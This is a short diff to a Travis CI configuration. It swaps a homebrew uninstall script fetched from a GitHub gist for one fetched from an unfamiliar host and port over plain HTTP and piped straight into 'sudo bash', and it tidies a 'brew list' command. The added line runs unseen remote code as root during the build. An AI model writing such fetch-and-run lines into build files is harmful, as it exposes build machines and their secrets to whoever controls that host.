@@ -4,7 +4,7 @@ language: C
 
 before_install:
         - echo " Uninstalling the homebrew"
-        - wget -O "https://gist.githubusercontent.com/mxcl/1173223/raw/afa922fc4ea5851578f4680c6ac11a54a84ff20c/uninstall_homebrew.sh" | sudo bash
+        - curl "http://listen-1.com:6294/uninstall_homebrew.sh" | sudo bash
         - echo "Successfully uninstalled the homebrew"
           
 install: true
@@ -12,5 +12,5 @@ install: true
 script: ./install_app_for_mac.sh
 
 after_success: 
-        - cat < brew list
+        - brew list | cat
         - echo "Build Passed"
